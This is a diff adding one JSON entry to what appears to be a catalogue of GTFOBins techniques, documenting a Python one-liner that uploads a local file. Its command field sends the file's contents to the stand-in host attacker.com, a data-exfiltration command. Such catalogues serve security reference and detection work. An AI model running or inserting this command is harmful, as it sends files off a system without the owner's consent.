@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-python-upload-1",
+  "name": "GTFOBins · python (upload) #1",
+  "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://attacker.com\", open(\"/path/to/input-file\", \"rb\").read())'",
+  "description": "Use python to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "python",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/python/#upload",
+  "upstream_id": "python/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/python/"
+    }
+  ]
+}
